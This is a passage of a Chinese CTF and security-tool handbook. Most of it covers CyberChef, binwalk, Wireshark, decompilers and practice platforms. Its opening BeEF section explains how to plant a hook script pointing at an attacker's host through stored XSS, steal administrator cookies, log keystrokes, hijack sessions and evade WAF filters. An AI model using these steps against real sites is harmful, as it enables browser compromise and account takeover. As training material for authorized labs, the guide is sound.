## [g-exp] 漏洞利用框架——注入、漏洞利用与浏览器攻击

### [beef] BeEF 浏览器利用框架 | medium | beef;xss;browser | beef;浏览器攻击
> BeEF 专注浏览器端攻击，配合存储型 XSS 挂 hook 后即可对受害者浏览器执行模块化利用。

#### 这个条目的作用
一句话：BeEF（Browser Exploitation Framework）是专门攻击「浏览器」的工具。你先把一小段 JS（hook.js）想办法塞进目标网页，之后只要有人用浏览器打开这个页面，他的浏览器就会自动连回你的 BeEF 控制台，你就能远程对这台浏览器执行偷 Cookie、键盘记录、截图、钓鱼等模块化操作。

#### 前置条件
- 一台 Kali/Ubuntu 主机（BeEF 主要在 Linux 上跑），能访问目标页面。
- 一个能往页面里注入脚本的入口（最常用：存储型 XSS 留言板，或你自己搭的钓鱼页）。
- 会往页面里写脚本标签，例如 `<script src="http://你的IP:3000/hook.js"></script>`。
- 目标浏览器能访问你的 IP 端口（同网段或公网可达），防火墙不要拦 3000 端口。

#### 第 1 步：安装 BeEF
操作：Kali 自带，直接启动；其他系统用 git 装。
命令：
```bash
# Kali（自带，直接启动）
sudo beef-xss

# 源码安装（任意 Linux）
git clone https://github.com/beefproject/beef
cd beef
sudo ./install        # 自动装 ruby 依赖
sudo ./beef
```
预期结果：终端显示 BeEF 已启动，并打印 UI 地址（默认 http://127.0.0.1:3000/ui/panel）和默认账号。
如果不行：`./install` 报缺依赖，先 `sudo apt install ruby-dev build-essential libsqlite3-dev` 再重试；端口被占用就改 `config.yaml` 里的 `http.port`。

#### 第 2 步：登录控制台
操作：浏览器打开 http://127.0.0.1:3000/ui/panel，输入默认账号。
命令/配置：默认用户名 `beef`，密码 `beef`（首次登录会要求改密码）。
预期结果：进入左侧是命令树、右侧空白的控制台界面。
如果不行：登不进去看第 1 步启动日志里打印的账号密码；忘记密码就删掉 `beef.db` 重启恢复默认。

#### 第 3 步：把 hook 注入目标页面
操作：找到你能控制内容的页面（如留言板），把 hook 脚本标签贴进去并保存。
命令：往可注入位置写入
```html
<script src="http://你的IP:3000/hook.js"></script>
```
预期结果：受害者打开该页面后，浏览器加载这段 JS，BeEF 控制台「Online Browsers」区出现一个绿色圆点（新上线浏览器）。
如果不行：页面是 HTTPS 而你的 hook 是 HTTP，浏览器会因混合内容拦截——hook 地址改 HTTPS（BeEF 默认同时监听 6789 HTTPS 端口，用 `https://IP:6789/hook.js`）；或先自己访问一次注入页面确认注入点本身有效。

#### 第 4 步：确认浏览器上线
操作：控制台左侧点开上线浏览器的 IP 条目，查看它的系统、浏览器版本、插件信息。
预期结果：能看到受害者浏览器指纹，说明 hook 成功、可以开始攻击。
如果不行：浏览器没上线，先在受害者机器手动访问一次注入页面并保持打开，排除「页面根本没被访问」的情况。

#### 第 5 步：执行模块
操作：选中上线浏览器 → 左侧「Commands」树选择模块 → 点右上 Execute。
常用模块路径：
| 想做什么 | 模块路径 |
|---|---|
| 偷 Cookie | Commands → Browser → Hooked Domain → Get Cookie |
| 键盘记录 | Commands → Browser → Keylogger |
| 屏幕截图 | Commands → Browser → Screenshot |
| 内网探测 | Commands → Network → 内网探测类模块 |
预期结果：模块状态变为 Completed/Finished，右侧结果区显示返回数据（如 Cookie 值）。
如果不行：模块返回 error 多为目标浏览器不支持该特性，换一个同类模块试。

#### 第 6 步：典型玩法——偷管理员 Cookie
操作：留言板注入 hook → 等管理员打开后台页 → Get Cookie 拿 session → 自己在浏览器替换 Cookie 登入后台。
命令：得到 Cookie 后，用浏览器开发者工具（F12 → Application → Cookies）把对应字段改成偷到的值。
预期结果：能以管理员身份访问后台。
> [!warn] 在授权范围外对他人浏览器挂 hook 属违法行为；只在自己靶场、CTF 题目或获得授权的环境中使用。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 浏览器一直不上线 | hook.js 地址不可达或端口被防火墙拦 | 受害者机器先 curl 测 `http://IP:3000/hook.js` 能否返回 JS |
| 控制台登录失败 | 默认密码被改或数据库残留旧密码 | 删 beef.db 重启恢复 beef/beef |
| HTTPS 页面 hook 不执行 | 混合内容（HTTPS 页加载 HTTP 脚本）被浏览器拦截 | hook 地址改用 `https://IP:6789/hook.js` |
| 模块执行报 error | 目标浏览器版本不支持该模块特性 | 换同类模块；老浏览器兼容性最好 |

#### 实战要点
- hook 注入点首选存储型 XSS：留言板、评论、用户昵称，一次注入长期生效。
- 上线后第一时间 Get Cookie + 键盘记录，这两样信息价值最高。
- 页面必须保持打开，受害者一关页面浏览器就掉线，别等太久。
- hook 脚本会被 WAF/过滤器拦截，可对 `<script>` 做编码混淆或改用 img 标签触发。
- 先在自己浏览器上验证整条链路（上线→模块→数据返回），再投入实战。

## [g-fore] 取证与解码——编解码、隐写、流量分析

### [cyberchef] CyberChef 常用配方 | easy | cyberchef;decode;encode | cyberchef;编码解码
> 网络版瑞士军刀，可视化拖拽编解码，从 Base64 到 XOR 爆破一条龙。

#### 这个条目的作用
CyberChef 是 GCHQ 开源的网页版「编码瑞士军刀」：左边是配方列表，中间是 Recipe（配方）区，右边是输入输出。CTF 里 90% 的编解码题——Base64、Hex、URL、ROT、XOR、压缩——拖几个模块进去就能解开，不用装任何本地脚本。

#### 前置条件
- 能打开网页的浏览器（访问 https://gchq.github.io/CyberChef/，在线版无需安装）。
- 一份待解码的密文（题目给的字符串或文件内容）。
- 会复制粘贴文本，会拖拽鼠标。

#### 第 1 步：打开并粘贴密文
操作：访问 CyberChef 在线版，把密文粘贴到右上「Input」框。
预期结果：Input 区显示你的密文，Output 区暂时是原样或乱码。
如果不行：密文在文件里就先打开文件复制；Input 框内容太多可以点右下角齿轮调字号。

#### 第 2 步：先拖 Magic 自动解码
操作：左侧搜索框输入 Magic，把「Magic」模块拖到中间 Recipe 区。
预期结果：Output 区自动变成可读文本（Magic 会尝试识别 Base64/Hex/URL/ROT 等常见编码）。
如果不行：Magic 识别错或解不出来，说明是多层编码或冷门算法，继续第 3 步手动组合。

#### 第 3 步：手动逐层解码
操作：按「外层到内层」顺序叠加模块：先 URL Decode → From Base64 → From Hex → ROT13，解一层看一层输出。
命令：Recipe 区依次拖入并保持从上到下排列：
```txt
URL Decode
From Base64
From Hex
ROT13
```
预期结果：每拖入一个模块，Output 立即更新；解到某一步出现 `flag{...}` 或可读句子即完成。
如果不行：解到某层输出变成乱码，说明层顺序不对或这层不是该编码，把该模块删掉换别的（如 From CharCode、From Binary）。

#### 第 4 步：XOR 爆破
操作：怀疑是单字节 XOR 时，拖入「XOR Brute Force」模块。
命令：模块参数 Key Length 设为 1（或 1-2），勾选「Intensive」选项。
预期结果：输出列出多个候选明文，其中一条是可读的 flag。
如果不行：1 字节爆破不出可读文本，试 Key Length 2；或先拖 Magic 看它是否提示 XOR 可能性。

#### 第 5 步：处理压缩/文件类数据
操作：密文解出是 gzip/zip 二进制时，拖「Gunzip」或「Extract Files」。
命令：压缩数据先 From Base64/From Hex 还原二进制，再拖 Gunzip；内含文件用 Extract Files 一次抽出。
预期结果：Output 变成解压后的内容，或 Extract Files 面板列出提取出的文件名可下载。
如果不行：Gunzip 报错说明数据头不对，确认前一步是否真的还原成了原始二进制（看 Output 是否出现 `1f 8b` 等魔数）。

#### 第 6 步：保存与分享配方
操作：Recipe 区完成后，点右上「Save」把配方存成 .recipe 文件，或复制「Get recipe link」分享链接。
预期结果：下次做题直接导入配方一键重跑。
> [!tip] 把「Magic → URL Decode → From Base64 → From Hex → ROT13」存成常用配方，新题先套这个再分析。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| Magic 解出来是乱码 | 多层编码或编码类型冷门 | 手动分层解，每层看一次输出判断方向 |
| From Base64 报错 | 密文含换行/空格污染 | 先加「Remove Line Breaks」模块再解码 |
| 解到一半输出全是 0 和 1 | 上一步其实是二进制层 | 补一个「From Binary」模块 |
| Gunzip 失败 | 前面没还原成原始二进制 | 检查是否缺了 From Hex/From Base64 这一步 |

#### 实战要点
- 万能起手式：Magic 不行就 Base64 → Hex → URL → ROT → XOR 五连试。
- 密文含大量特殊符号优先试 URL Decode；纯数字逗号分隔试 From CharCode。
- 看到 Base64 特征（A-Za-z0-9+/ 且长度是 4 的倍数）先解一层再说。
- 多层编码题每解一层就停一下观察，别一口气全拖上去。
- 在线版数据只在本地浏览器处理，题目密文可以放心粘贴。

### [strings-binwalk] 文件取证与隐写工具 | easy | strings;binwalk;foremost;stego | strings;binwalk;foremost
> 二进制与文件取证三件套：strings 看内容、binwalk 找内嵌、foremost 提取，处理图片固件流量包必备。

#### 这个条目的作用
CTF 的 misc/取证题常把 flag 藏在图片、压缩包、固件里：strings 直接翻出文件里的可打印字符串，binwalk 找出「文件里还嵌着别的文件」，foremost 按文件头把这些内嵌文件抠出来。三件套从上到下就是一条完整取证流水线。

#### 前置条件
- Linux 环境（Kali 自带；其他发行版需安装 binwalk、foremost，strings 属于 coreutils 自带）。
- 一个可疑文件：图片（png/jpg）、压缩包、bin 固件或 pcap。
- 基础命令常识：ls、cd、file、grep。

#### 第 1 步：安装工具
操作：确认三个工具都在。
命令：
```bash
which strings binwalk foremost
sudo apt install binwalk foremost   # 缺哪个装哪个（strings 无需装）
```
预期结果：三条路径都打印出来，或安装命令正常结束。
如果不行：apt 找不到源，先 `sudo apt update`；非 Debian 系用对应包管理器（pacman/dnf）装同名的包。

#### 第 2 步：file 与 strings 初筛
操作：先看文件真实类型，再翻字符串找明文线索。
命令：
```bash
file mystery.png
strings mystery.png | grep -iE 'flag|key|password|ctf'
strings -n 6 mystery.png          # 只看长度 ≥6 的字符串，过滤噪声
strings -e l mystery.png          # 提取 UTF-16LE 字符串（Windows 程序常见）
```
预期结果：file 显示真实格式；grep 可能直接打出 flag 或提示性关键词。
如果不行：没有命中就把 strings 输出存文件 `strings mystery.png > out.txt`，用编辑器慢慢翻；flag 常藏在图片信息段或文件尾部。

#### 第 3 步：binwalk 扫描内嵌文件
操作：扫描文件结构，看里面是否藏着别的文件。
命令：
```bash
binwalk mystery.png
```
预期结果：输出多行 DECIMAL/HEXADECIMAL/OCTAL 的「压缩包、Zlib、PNG」等结构标记，说明文件里嵌了内容；只有一行普通 PNG 结构则基本没内嵌。
如果不行：binwalk 命令不存在就用第 1 步重装；提示需要 root 就加 sudo。

#### 第 4 步：binwalk 自动提取
操作：把内嵌文件全部解出来。
命令：
```bash
binwalk -e mystery.png
ls _mystery.png.extracted/
```
预期结果：生成 `_mystery.png.extracted` 目录，里面有提取出的文件（zip、txt 等）。
如果不行：提取失败或目录为空，改用 `binwalk --dd='.*' mystery.png` 强制按所有文件头提取，或换 foremost（第 5 步）。

#### 第 5 步：foremost 按文件头提取
操作：binwalk 漏掉时用 foremost 按文件头魔数批量抠文件。
命令：
```bash
foremost -i mystery.png -o /tmp/out
find /tmp/out -type f
```
预期结果：/tmp/out 下出现 audit.txt 和按类型分的目录（jpg、zip 等），find 列出全部提取物。
如果不行：先确认文件确实含有别的文件头（`xxd mystery.png | tail` 看文件尾部有没有 zip 的 `PK` 魔数）；foremost 默认只认常见类型，`-t` 参数可指定类型。

#### 第 6 步：解压提取物找 flag
操作：对提取出的压缩包/文件继续操作。
命令：
```bash
cd /tmp/out
file zip/00000000.zip
unzip -o zip/00000000.zip
strings flag.txt
```
预期结果：解开压缩包（可能有密码，题目会在提示或文件名里给）后拿到 flag 文件，strings 或直接 cat 读出内容。
如果不行：压缩包有密码就先找题目提示；内嵌多层就重复「binwalk → unzip → strings」循环直到出结果。

> [!tip] 图片隐写标准套路：先 strings 找明文 → 再 binwalk -e 找内嵌 → 最后看文件尾部是否追加内容（`xxd file | tail`）。

> [!warn] binwalk -e 可能解出多层嵌套目录，解完用 `find . -type f` 全列一遍，别漏掉深层文件。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| strings 输出全是乱码 | 文件是压缩/加密过的，没有明文 | 先 file 确认类型，再走 binwalk 流程 |
| binwalk -e 目录为空 | 提取规则没覆盖该文件类型 | 用 `--dd='.*'` 强制提取或换 foremost |
| unzip 要密码 | 内嵌压缩包被加密 | 找题目提示/文件名中的线索，常见密码是文件名或「password」 |
| 提取出的文件打不开 | 提取不完整或文件损坏 | 重新用 `binwalk -D 'zip:zip'` 按指定类型精确提取 |

#### 实战要点
- 顺序永远是从外到内：file → strings → binwalk → 解压，一层层剥。
- strings 加 `-n 6` 能滤掉大量二进制噪声，命中率更高。
- 看到文件末尾有 `PK`（zip）或 `1f 8b`（gzip）魔数，直接 binwalk 或手动截取。
- flag 可能被拆成多段分布在多个提取物里，全部文件都要翻。
- 固件类题目（binwalk 解出 squashfs 文件系统）解出来记得看 /etc 和启动脚本。

### [wireshark] Wireshark 与 tshark 过滤语法 | medium | wireshark;tshark;pcap | wireshark;抓包分析
> 流量包分析核心技能，过滤语法在 Wireshark 顶部过滤栏与 tshark -Y 参数两处通用。

#### 这个条目的作用
Wireshark 是图形化抓包/看包工具，tshark 是它的命令行版。CTF 流量题给你一个 .pcap，flag 往往藏在 HTTP 请求参数、明文 FTP/Telnet 口令、DNS 查询或某个文件传输里——会过滤和 Follow 流，就能在几千个包里几分钟定位目标。

#### 前置条件
- 装有 Wireshark（Kali 自带；`sudo apt install wireshark`）和 tshark（随 Wireshark 一起装）。
- 一个 .pcap/.pcapng 流量包文件。
- 基本概念：TCP 流、HTTP 请求/响应、IP/端口。

#### 第 1 步：打开 pcap 文件
操作：启动 Wireshark 打开题目 pcap。
命令：
```bash
wireshark capture.pcap     # 图形界面打开
```
预期结果：主窗口列出几百上千个数据包，每行是 时间/源IP/目的IP/协议/长度/Info。
如果不行：打不开说明文件损坏或不是标准 pcap，先 `file capture.pcap` 确认格式；没有图形环境就用 tshark（第 6 步）。

#### 第 2 步：用显示过滤器缩小范围
操作：在顶部过滤栏输入表达式回车；过滤不改变数据，只是隐藏不匹配的包。
常用过滤器：
```txt
http                                  # 只看 HTTP 流量
ip.addr == 1.2.3.4                    # 只看某 IP 相关流量
tcp.port == 80                        # 只看 80 端口
http.request.method == POST           # 只看 POST 请求
dns.qry.name contains "flag"          # DNS 查询里含 flag
frame contains "password"             # 载荷里含 password 关键字
tcp.stream eq 12                      # 只看第 12 条 TCP 流
```
预期结果：包列表只剩符合条件的包，数量大幅下降。
如果不行：过滤器红底说明语法错，检查字段名拼写（协议小写、字段用点号）；`contains` 的值要加引号。

#### 第 3 步：Follow TCP Stream 看完整对话
操作：右键任意包 → Follow → TCP Stream。
预期结果：弹出新窗口，把这条 TCP 流里的请求和响应按顺序拼在一起显示，HTTP 登录请求里能看到明文账号密码。
如果不行：内容乱码说明是二进制流（如图片传输），在 Stream 窗口右下角切换显示格式为 Hex/HTML 再分析。

#### 第 4 步：导出 HTTP 传输的文件
操作：菜单 File → Export Objects → HTTP，列出所有经 HTTP 传输的文件。
预期结果：看到题目传输的图片、zip、flag.txt 等对象，Save 下来即可。
如果不行：对象列表为空说明文件走的是其他协议，改 Export Objects 里的其他协议类型，或回到过滤器用 `tcp contains "PK"` 找 zip 传输流。

#### 第 5 步：用 tshark 命令行快速过滤
操作：适合批量/服务器环境，一条命令出结果。
命令：
```bash
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort -u
tshark -r capture.pcap -Y 'frame contains "flag"'
tshark -r capture.pcap -z conv,tcp        # 会话统计，找数据量大的流
```
预期结果：逐条打印符合条件的字段（URL、域名等），一眼扫出可疑目标。
如果不行：`-Y` 后面的过滤表达式要加引号；字段名写错会提示 invalid field，对照 Wireshark 里的列名修改。

#### 第 6 步：定位可疑流再深挖
操作：先统计找出异常（大流量流、陌生 IP），再 Follow 那一条流。
命令：
```bash
tshark -r capture.pcap -z io,stat,30    # 按 30 秒分段统计流量峰值
tshark -r capture.pcap -z endpoints,tcp # 统计各 IP 的流量
```
预期结果：峰值时段或大流量 IP 指向关键交互（如文件下载、命令交互）。
如果不行：流量分布看不出异常，就按关键字广撒网：`frame contains "flag"`、`frame contains "key"`、`http.request.uri contains "="`。

> [!tip] 抓 HTTP 登录包直接 Follow TCP Stream 看明文口令；找攻击行为就 `ip.addr` 组合 `http`，或直接搜 flag、passwd、key 关键字。

> [!warn] 大 pcap 先统计缩小范围再 Follow，直接全量 Follow 会卡死且浪费时间。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 过滤器标红 | 字段名或语法错误 | 用 `http`、`tcp.port` 这类已知字段，值加引号 |
| Follow 出来是乱码 | 该流传输的是二进制数据 | 右下角切换 Hex/HTML 视图，或换一条流 |
| 找不到 flag 关键字 | flag 被编码或拆分传输 | 试 `frame contains` 大小写变体、base64 特征串、图片里的隐写 |
| 包太多卡死 | 文件太大 | 先 `-z io,stat` 分段统计，再针对性过滤 |
| 明文口令找不到 | 流量是加密的（HTTPS/SSH） | 看握手后是否有 TLS；有则需配合会话密钥或换非加密协议题 |

#### 实战要点
- 拿到 pcap 先按协议数一遍：Statistics → Protocol Hierarchy，看流量集中在哪。
- HTTP 题 90% 靠「过滤 + Follow 流 + 导出对象」三步解决。
- FTP/Telnet 是明文协议，直接 Follow 就能看到完整口令交互。
- flag 常出现在 GET 参数、POST 体、DNS 查询名、图片传输文件里，四处都要查。
- tshark 和 Wireshark 过滤语法完全一致，能写一行 tshark 就别开图形界面。

## [g-res] 在线与资源——解码站、反编译、CTF 平台

### [online-decode] 在线解码与转换工具 | easy | decode;online;tool | 解码站;在线工具
> 解码需求在线解决，收藏几个全能的就够，避免本地装一堆脚本。

#### 这个条目的作用
做题时最常遇到的不是「不会解」，而是「这是啥编码」。在线解码站把几百种编码/加密/哈希的识别和解码集成在一个网页里，粘贴即解，不用为每种编码装本地工具。收藏下面这几个站点，覆盖 CTF 九成解码需求。

#### 前置条件
- 能联网的浏览器。
- 一段待识别的密文。
- （可选）能截图/上传文件，用于二维码、图片类解码。

#### 第 1 步：搭建自己的解码工具箱
操作：把这几个站点收藏进浏览器书签文件夹「解码」。
| 站点 | 用途 |
|---|---|
| dcode.fr | 解码大全：几百种编码、加密与谜题工具，带识别功能 |
| CyberChef（gchq.github.io/CyberChef） | 可视化编解码瑞士军刀，拖拽组合 |
| cmd5.com / somd5.com | MD5、SHA 彩虹表在线查询 |
| crackstation.net | 哈希在线破解（大字典） |
| 站长工具（tool.chinaz.com） | Base64、URL、时间戳等日常转换 |
| zxing 在线二维码 | 二维码内容解码 |
| tool.lu/timestamp | 时间戳与日期互转 |
预期结果：书签栏出现一排解码站，随取随用。
如果不行：个别站点打不开，用能访问的替代（dcode.fr 通常可直连，必要时用本地 CyberChef 离线版）。

#### 第 2 步：用识别功能猜编码
操作：打开 dcode.fr，粘贴密文到首页的识别工具（Identify 工具），点分析。
预期结果：页面给出「可能是 Base64 / ROT13 / 某种密码」的候选列表及置信度，按提示点进对应工具解码。
如果不行：识别不出说明是自定义算法或非标准编码，改用 CyberChef 的 Magic 再试（第 3 步）。

#### 第 3 步：CyberChef Magic 兜底
操作：打开 CyberChef，密文贴进 Input，拖入 Magic 模块。
预期结果：Output 自动给出最可能的解码结果，多数常见编码一步到位。
如果不行：Magic 解出的不是可读文本，回到 dcode.fr 按候选列表逐个手动尝试。

#### 第 4 步：哈希在线查表
操作：密文是 32 位十六进制（MD5）或 40 位（SHA1）等哈希时，去查表站。
命令：访问 cmd5.com（或 crackstation.net），粘贴哈希，点查询。
预期结果：直接返回明文（如 `admin`、`123456`），表示彩虹表/字典命中。
如果不行：查不到说明明文较长或带盐，换 crackstation 大字典站再试；都不行就得本地 hashcat 跑（见 hashcat 条目）。

#### 第 5 步：二维码与图片类解码
操作：二维码截图后用 zxing 在线解码；图片右键「查看详情/属性」看 EXIF 信息。
预期结果：二维码内容（常是 URL 或 flag）被读出；EXIF 里可能藏着作者名、GPS 坐标、备注等线索。
如果不行：图片属性里看不到信息，说明线索不在 EXIF，转 strings/binwalk 走本地取证流程。

#### 第 6 步：时间戳等日常转换
操作：遇到一长串 10 位/13 位数字（Unix 时间戳），用 tool.lu/timestamp 或站长工具转换。
预期结果：数字变成具体日期时间，题目常把时间点设计成生日/纪念日作为密码。
如果不行：数字不是合法时间戳（超出范围），考虑它可能是别的数字编码（ASCII、进制转换），去 dcode.fr 试。

> [!tip] 密文识别顺序固定：CyberChef Magic → dcode.fr 识别 → 哈希查表。前三步覆盖 CTF 九成解码题。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| dcode.fr 识别结果都不对 | 密文经过多重编码 | 识别出单层后把结果再喂给识别工具，循环剥 |
| 哈希查不到明文 | 明文复杂或带盐 | 换 crackstation；或本地 hashcat + 规则变形 |
| 站点打不开 | 网络/地区限制 | 换镜像、换同类站点，或本地装 CyberChef 离线版 |
| 二维码解不出 | 图片模糊/损坏 | 换高清截图，用手机扫码确认内容后再录入 |

#### 实战要点
- 收藏夹固定 4 个就够：dcode.fr、CyberChef、cmd5/crackstation、时间戳工具。
- 别把敏感/真实业务数据贴进陌生在线站——只贴题目密文。
- 识别不出来时优先怀疑「多层编码」：Base64 → Hex → ROT13 循环剥。
- 在线站一般只能解「标准算法」，自定义加密必须回本地逆向。

### [decompile-tools] 反编译与逆向工具清单 | medium | decompile;reverse;jadx;ghidra | 反编译;逆向
> 按语言选工具：Java 用 jadx，Python 用 uncompyle6，通用二进制用 Ghidra，一套覆盖 CTF 与实战。

#### 这个条目的作用
题目给你一个 APK、jar、pyc 或 ELF 程序，逆向目标通常是「看懂它的加密/校验逻辑，还原出 flag」。反编译就是把二进制/中间码翻译回接近源码的样子：APK 用 jadx 还原成 Java，pyc 用 uncompyle6 还原成 Python，exe/ELF 用 Ghidra 反编译成伪代码。按语言选对工具，事半功倍。

#### 前置条件
- 一个待分析文件（apk/jar/pyc/exe/elf）。
- 按目标语言装好对应工具（下面每步都有安装命令）。
- 能看懂一点 Java/Python/C 语法（反编译产物与源码有差异，但逻辑可读）。

#### 第 1 步：先摸清文件类型
操作：任何逆向题先 file 看真实格式，再决定用什么工具。
命令：
```bash
file challenge.pyc
file app.apk
file crackme
```
预期结果：输出标明 Python bytecode 版本 / Android package / ELF executable 等。
如果不行：file 输出 Unknown 或 OpenPGP 等混淆类型，说明文件被处理过（加密/加壳），先搜线索或走脱壳流程。

#### 第 2 步：APK 用 jadx 还原 Java 源码
操作：安装 jadx 并反编译 APK。
命令：
```bash
sudo apt install jadx        # Kali 自带
jadx -d out app.apk          # 输出到 out 目录
# 或图形界面
jadx-gui app.apk
```
预期结果：out/sources 下是还原出的 .java 源码树，jadx-gui 窗口里可直接浏览；在源码里搜 `flag`、`key`、`secret` 往往直接命中。
如果不行：源码都是空壳或只有 stub 类，说明 APK 加壳（如加固），需要先脱壳，或改用 jadx 的「Show Bytecode」看 smali 层。

#### 第 3 步：Python pyc 用 uncompyle6 还原
操作：安装并反编译 pyc。
命令：
```bash
pip install uncompyle6
uncompyle6 challenge.pyc > challenge.py
cat challenge.py
```
预期结果：challenge.py 是接近原始源码的 Python 代码，加密函数和 flag 拼接逻辑一目了然。
如果不行：报 `Python version not supported` 说明 pyc 版本太新（3.9+），改用 decompyle3 或 pycdc；再不行就只能用 `dis` 模块读字节码。

#### 第 4 步：通用二进制用 Ghidra
操作：下载安装 Ghidra（NSA 开源），导入二进制。
命令：
```bash
# 从 https://github.com/NationalSecurityAgency/ghidra 的 release 下载解压
./ghidraRun        # Linux/macOS；Windows 用 ghidraRun.bat
```
操作：新建项目 → Import File 选二进制 → 双击打开 → 提示时选 Yes 自动分析 → 主窗口看 Decompile 视图（C 伪代码）。
预期结果：左侧是函数列表，Decompile 面板显示 C 风格伪代码；找到 main 或加密相关函数，搜字符串引用定位 flag 处理逻辑。
如果不行：伪代码全是 `undefined` 或看不懂，先在 Strings 窗口看字符串列表（右键字符串 → References 找交叉引用），从字符串反推逻辑。

#### 第 5 步：Java jar/class 与 .NET
操作：jar/class 用 jd-gui 或 CFR；.NET 用 dnSpy（Windows）。
命令：
```bash
# jd-gui：下载 release 运行，把 jar 拖进窗口即反编译
# CFR 命令行（jd-gui 失败时）
java -jar cfr.jar app.jar --outputdir out
# .NET（Windows）
dnSpy.exe  # 打开 exe/dll 直接显示 C# 源码
```
预期结果：jd-gui 左侧包树点开即见 Java 源码；dnSpy 显示还原的 C# 方法体。
如果不行：jd-gui 反编译失败换 CFR；.NET 混淆过就用 dnSpy 的编辑功能配合动态调试。

#### 第 6 步：验证与动态调试
操作：静态看不懂的关键逻辑，用 gdb（Linux ELF）或 x64dbg（Windows）动态跑。
命令：
```bash
gdb ./crackme
(gdb) break main
(gdb) run
(gdb) info registers
```
预期结果：在断点处观察寄存器/内存，对照伪代码确认逻辑；需要改流程就 set 寄存器或 patch 字节。
如果不行：gdb 不会用就先只用静态分析——CTF 大部分题静态读懂伪代码就够出 flag，动态是补充手段。

> [!tip] 逆向题先 strings 找线索再定语言选工具；遇到加密逻辑就在反编译结果里搜密钥常量（32 位 hex 或硬编码字符串）。

> [!warn] 反编译产物仅供参考，混淆与优化代码会失真；关键逻辑（比较、解密）要结合动态调试验证，别盲信伪代码。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| uncompyle6 不支持该 pyc 版本 | Python 3.9+ 字节码变化 | 换 decompyle3 / pycdc |
| jadx 只见空壳类 | APK 加壳 | 先脱壳再反编译，或看 smali 层 |
| Ghidra 伪代码看不懂 | 函数被优化/内联 | 从 Strings 交叉引用入手，先定位 main |
| jd-gui 反编译失败 | 字节码太新或混淆 | 换 CFR 命令行反编译 |
| flag 搜不到 | 字符串被加密/拼接 | 搜常量、异或运算代码，动态调试断在比较处 |

#### 实战要点
- 工具按语言选：APK→jadx，pyc→uncompyle6/pycdc，ELF/exe→Ghidra，.NET→dnSpy。
- 拿到文件先 file，别拿 jadx 硬解 exe。
- 反编译结果里第一优先搜：`flag`、`key`、`password`、`base64`、`md5`。
- 加密题的核心是找「输入→输出」的变换代码，读懂一段变换往往就是答案。
- 混淆过的代码别硬读，动态调试在关键比较处下断点看寄存器。

### [ctf-platforms] CTF 平台与资源站 | easy | ctf;platform;resource | CTF平台;资源
> 平台刷题、靶场练手、仓库查 payload，三个方向各收藏一两个就够用。

#### 这个条目的作用
学 CTF 的三个刚需：刷题平台（有环境能跑题的题库）、本地靶场（自己搭起来练手的漏洞环境）、资源仓库（payload、字典、漏洞库）。把下面这些站点/仓库收藏好，从入门到实战一路够用。

#### 前置条件
- 能联网的浏览器和 GitHub 访问。
- 本地练靶场需要 Docker 或 Linux 虚拟机（Kali 推荐）。
- 一个用于注册的邮箱。

#### 第 1 步：注册刷题平台
操作：注册 BUUCTF（国内聚合题库，题型全、有在线环境）和攻防世界（XCTF，入门题友好）。
命令/配置：
```txt
BUUCTF:  https://buuoj.cn
攻防世界: https://adworld.xctf.org.cn
CTFshow: https://ctf.show   （按方向分门别类，可补充）
```
预期结果：登录后能看到题目列表，每题有题目描述、附件下载和（BUUCTF 的）在线起环境按钮。
如果不行：注册收不到验证邮件就换邮箱或稍后再试；个别平台要邀请码的跳过，先用 BUUCTF。

#### 第 2 步：完成第一道入门题
操作：在 BUUCTF 选一道 easy/签到题（如简单 misc 或 web 题），下载附件做题，提交 flag 格式的答案。
预期结果：提交 `flag{...}` 后显示 Accepted/正确，题目进入已解列表。
如果不行：flag 格式不对（大小写、花括号）会判错，仔细看题目给的前缀；不会做就看题目下的 WriteUp（题解），先模仿再独立。

#### 第 3 步：搭本地漏洞靶场
操作：用 Docker 一键起 DVWA（经典 Web 漏洞靶场），练 SQL 注入/XSS/文件上传。
命令：
```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
# 浏览器访问 http://127.0.0.1/，默认账号 admin / password
```
预期结果：浏览器打开 DVWA 登录页，登录后可切换漏洞等级（Low/Medium/High），每个漏洞有源码参考。
如果不行：没装 Docker 先 `sudo apt install docker.io` 并启动服务；80 端口被占就把 `-p 80:80` 改成 `-p 8080:80` 后访问 8080。

#### 第 4 步：专项靶场按需补
操作：练文件上传上 Upload-Labs；练 SQL 上 SQLi-Labs；想要更多就装 Pikachu。
命令（GitHub 拉取本地跑）：
```bash
git clone https://github.com/c0ny1/upload-labs
git clone https://github.com/Audi-1/sqli-labs
```
预期结果：clone 下来按各仓库 README 放进 Web 环境（phpstudy/XAMPP）即可逐个关卡练习。
如果不行：PHP 环境没配好就先用 DVWA 覆盖大部分漏洞类型，专项靶场等本地环境熟练了再上。

#### 第 5 步：收藏 Payload 与资源仓库
操作：把资源仓库加入书签/星标。
| 仓库 | 内容 |
|---|---|
| PayloadsAllTheThings（github.com/swisskyrepo/PayloadsAllTheThings） | 全漏洞类型 payload 大全 |
| gtfobins（gtfobins.github.io）/ LOLBAS | 提权与绕检测技巧 |
| exploit-db（exploit-db.com）/ NVD / CNVD | 漏洞与 exp 查询 |
| SecLists（github.com/danielmiessler/SecLists） | 目录、口令、用户名大字典 |
预期结果：做题卡壳时能按漏洞类型翻到对应 payload/字典，Kali 本地还有一份 `/usr/share/seclists`。
如果不行：GitHub 访问慢就找镜像或 Gitee 克隆；SecLists 太大可只 clone 子目录（sparse checkout）。

#### 第 6 步：海外靶机环境（进阶）
操作：注册 HackTheBox / TryHackMe / Vulnhub，在授权环境里打真实靶机。
命令：Vulnhub 下载靶机 ova 导入 VirtualBox/VMware 即可；HTB/THM 用网页或 OpenVPN 连入。
预期结果：能对隔离的靶机做完整渗透（扫描→利用→提权→拿 flag）。
如果不行：HTB 需付费/排队就先用免费的 Vulnhub；网络连不上检查 VPN 配置文件。

> [!tip] 新手路径：DVWA 本地过一遍经典漏洞 → BUUCTF 刷简单题 → 卡壳查 PayloadsAllTheThings → 进阶上 Vulnhub。

